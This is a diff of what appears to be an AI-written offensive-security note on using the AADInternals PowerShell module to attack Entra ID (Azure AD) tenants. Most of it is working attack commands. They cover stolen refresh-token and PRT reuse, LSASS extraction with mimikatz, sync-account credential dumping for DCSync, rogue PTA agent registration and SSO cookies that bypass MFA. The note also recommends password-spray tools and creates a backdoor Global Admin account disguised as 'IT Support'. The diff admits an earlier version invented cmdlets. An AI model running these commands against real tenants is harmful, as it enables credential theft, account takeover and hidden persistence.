@@ -19,7 +19,9 @@ Import-Module AADInternals
 Get-Command -Module AADInternals | Measure-Object   # lists all available functions
 ```
 
-> [!note] **See also** — [[Entra ID]] for the broader Azure AD attack methodology, MFA bypass techniques, Conditional Access bypass, token abuse chains, and Graph API enumeration. This note covers the AADInternals module commands specifically.
+> [!note] **See also** — [[Services/Active Directory/Entra ID|Entra ID]] for the broader Entra/Azure AD attack methodology, MFA bypass, Conditional Access bypass, token abuse chains, and Graph API enumeration. This note covers the AADInternals module commands specifically.
+
+> [!warning] **AADInternals cmdlet names drift hard between versions — verify on the box.** Functions get renamed or **removed** release to release (spraying, PTASpy, and the PRT-nonce flow that older guides show are **gone** from the current public module). Before relying on a command here, confirm it exists: `Get-Command -Module AADInternals -Verb Get,Invoke,New,Set | Select Name`, or `Get-Command -Module AADInternals *PRT*`. Corrections below reflect the current `Gerenios/AADInternals` master.
 
 ---
 
@@ -68,30 +70,36 @@ Get-AADIntAccessTokenForMSGraph -DeviceCode
 # From a stolen refresh token
 $token = Get-AADIntAccessTokenForMSGraph -RefreshToken "<refresh-token>"
 
-# From a PRT (Primary Refresh Token stolen from LSASS)
-$nonce = Get-AADIntUserPRTNonce -PRTToken "<prt-base64>"
-$token = Get-AADIntAccessTokenForMSGraph -PRTToken "<prt-base64>" -SessionKey "<hex-key>" -Nonce $nonce
+# From a stolen PRT (Primary Refresh Token) — see the PRT section below;
+# the old Get-AADIntUserPRTNonce two-step is gone, mint the cookie with New-AADIntUserPRTToken
 
-# Cache token for reuse in the session
-$token | Set-AADIntAccessToken
+# Reuse a token across commands without passing -AccessToken each time:
+# acquire it with -SaveToCache $true, then omit -AccessToken on later calls
+$token = Get-AADIntAccessTokenForMSGraph -SaveToCache $true
 ```
 
 ---
 
 ## Password Spraying
 
+> [!warning] **AADInternals has no built-in spray cmdlet.** `Invoke-AADIntPasswordSpray*` (EWS/Graph/ADFS) **does not exist** — a prior version of this note invented them. AADInternals' role here is **recon + single-credential validation**; do the actual spray with a dedicated tool.
+
 ```powershell
-# Spray via EWS (Exchange Web Services) — often bypasses Smart Lockout
-Invoke-AADIntPasswordSprayEWS -UserList users.txt -Password "Spring2024!" -Verbose
+# 1. Enumerate valid users (no auth) and learn the tenant's auth type + lockout surface
+Invoke-AADIntReconAsOutsider -DomainName company.com | Format-List   # Managed vs Federated, MDI, SSO
+Invoke-AADIntUserEnumerationAsOutsider -UserList users.txt           # keep only the valid UPNs
 
-# Spray via Microsoft Graph API
-Invoke-AADIntPasswordSprayGraph -UserList users.txt -Password "Spring2024!"
-
-# Spray via AD FS (federated tenants)
-Invoke-AADIntPasswordSprayADFS -UserList users.txt -Password "Spring2024!" -ADFSUrl "https://sts.company.com"
+# 2. Validate ONE candidate credential (single account = no lockout risk)
+$cred = Get-Credential
+Get-AADIntAccessTokenForMSGraph -Credentials $cred    # returns a token = creds are valid
 ```
 
-> [!warning] **Smart Lockout** — Azure AD locks accounts after ~10 failed attempts per 60 seconds. Spray once per account per round, wait 60+ minutes between rounds. EWS endpoint can have different lockout counters than the primary endpoint.
+Then spray with the tool that matches the auth type:
+- **MSOLSpray** / **TREVORspray** — managed tenants (login.microsoftonline.com); parse Smart Lockout responses
+- **o365spray** / **omnispray** — modular, cover EWS / ADFS / Graph endpoints
+- **MFASweep** — once you get a hit, find which protocols skip MFA
+
+> [!warning] **Smart Lockout** — Entra locks accounts after ~10 failed attempts per 60 seconds. Spray once per account per round, wait 60+ minutes between rounds; some legacy endpoints (EWS/ADFS) track lockout separately from the primary endpoint.
 
 ---
 
@@ -124,36 +132,34 @@ Get-AADIntUsers -AccessToken $token | Where-Object {$_.AssignedRoles}
 Azure AD Connect syncs on-prem AD to Entra ID. The MSOL service account has DCSync rights on-prem — compromising the Connect server = full domain + tenant control.
 
 ```powershell
-# Run on the Azure AD Connect server (local admin required)
+# Run on the Azure AD Connect / Entra Connect Sync server (local admin required)
 Import-Module AADInternals
 
-# Extract MSOL service account credentials (cleartext)
-Get-AADIntSyncCredentials
-# Returns: MSOL username + password (use for DCSync on-prem)
-# Also returns: Azure AD connector account credentials
-
-# Use MSOL creds to DCSync from anywhere
+# Extract the MSOL_* sync-account credentials (cleartext) from the ADSync DB
+# NOTE: verify the exact cmdlet on your version — Get-AADIntSyncCredentials was
+# removed from recent public releases:
+Get-Command -Module AADInternals *Sync*, *ADSync*
+# The MSOL_* account has DCSync rights on-prem, so recovering it = full domain replication.
+# Use MSOL creds to DCSync from anywhere:
 # secretsdump.py 'corp.local/MSOL_abc123:<password>@<dc-ip>'
 ```
+
+> [!warning] **The one-liner cred dumper moved.** If your AADInternals build no longer exposes `Get-AADIntSyncCredentials`, the *technique* is unchanged — decrypt the ADSync SQL DB + DPAPI keys directly. Fallbacks: **`adconnectdump`** (fox-it) or dirkjanm's **ADSyncDecrypt** on the Connect server, or mimikatz. `Enable-AADIntTenantMsolAccess` / `Disable-AADIntTenantMsolAccess` toggle whether the MSOL path is usable.
 
 ---
 
 ## Pass-Through Authentication (PTA) Agent Abuse
 
-If the PTA agent runs on a host you control, you can intercept all authentication or accept any password.
+If the PTA agent runs on a host you control (or you register a rogue one), you can intercept authentication or accept any password.
+
+> [!warning] **PTASpy was pulled from the public module.** `Install-AADIntPTASpy` / `Get-AADIntPTASpyLog` / `Set-AADIntPTABypass` **no longer exist** in `Gerenios/AADInternals` master. What remains is **`Register-AADIntPTAAgent`** — register a *rogue* PTA agent to the tenant (needs a Global Admin token), which then authorises/harvests logons through infrastructure you control. Verify with `Get-Command -Module AADInternals *PTA*`.
 
 ```powershell
-# Install PTA spy — logs all auth attempts (username + plaintext password) to C:\PTASpy
-Install-AADIntPTASpy
-
-# Read captured credentials
-Get-AADIntPTASpyLog
-
-# Backdoor — make PTA agent accept ANY password for any Azure AD user
-Set-AADIntPTABypass -Enable $true
-
-# Disable bypass (clean up)
-Set-AADIntPTABypass -Enable $false
+# Register a rogue PTA agent against the tenant (Global Admin token required),
+# then run the agent service with the returned certificate to intercept auth.
+Register-AADIntPTAAgent -AccessToken $token
+# See the AADInternals docs for the current agent-install / bypass steps —
+# the historical PTASpy DLL-injection workflow is no longer shipped in the module.
 ```
 
 ---
@@ -163,17 +169,16 @@ Set-AADIntPTABypass -Enable $false
 PRTs are issued to Azure AD-joined Windows devices. Stealing one = authenticate as the user without MFA (device compliance already satisfied).
 
 ```powershell
-# PRT lives in LSASS — extract with Mimikatz first
-# privilege::debug
-# sekurlsa::cloudap   → outputs PRT base64 + session key hex
+# PRT + session key come from LSASS — Mimikatz: privilege::debug ; sekurlsa::cloudap
+# (or extract on-box with AADInternals' own device functions: Get-AADIntUserPRTKeys)
 
-# Use stolen PRT to get access token (no MFA required)
-$nonce = Get-AADIntUserPRTNonce -PRTToken "<prt-base64>"
-$token = Get-AADIntAccessTokenForMSGraph -PRTToken "<prt-base64>" -SessionKey "<hex-sessionkey>" -Nonce $nonce
+# Mint the SSO cookie (x-ms-RefreshTokenCredential) from the PRT + session key.
+# The nonce is fetched internally — the old Get-AADIntUserPRTNonce step is gone.
+$cookie = New-AADIntUserPRTToken -RefreshToken "<prt-base64>" -SessionKey "<hex-sessionkey>"
+# Set that value as the x-ms-RefreshTokenCredential cookie in a browser → portal.azure.com (rides the session, no MFA)
 
-# Create SSO cookie from PRT (use in browser to bypass login)
-$cookie = New-AADIntUserPRTToken -RefreshToken "<prt>" -SessionKey "<hex-key>"
-# Set cookie x-ms-RefreshTokenCredential in browser → navigate to portal.azure.com
+# To exchange a PRT for an access token programmatically instead, use the PRT-token cmdlets:
+Get-Command -Module AADInternals *PRTToken*   # e.g. Get-AADIntAccessTokenWithPRTToken
 ```
 
 ---
@@ -198,9 +203,11 @@ New-AADIntKerberosTicket `
 ## Backdooring
 
 ```powershell
-# Create a new Global Admin account
+# Create a new user, then grant Global Admin.
+# NOTE: Add-AADIntGlobalAdmin does not exist — add to the role by its INTERNAL name,
+# which is "Company Administrator" (= Global Administrator in the portal).
 New-AADIntUser -UserPrincipalName backdoor@company.com -DisplayName "IT Support" -Password "P@ssw0rd123!"
-Add-AADIntGlobalAdmin -UserPrincipalName backdoor@company.com
+Add-AADIntRoleMembersByRoleName -RoleName "Company Administrator" -UserPrincipalName backdoor@company.com
 
 # Reset any user's password (bypasses MFA-protected self-service reset)
 Set-AADIntUserPassword -SourceAnchor "<immutable-id>" -Password "NewPass123!"
@@ -233,5 +240,5 @@ Read-AADIntAccessToken -AccessToken "<jwt>"
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
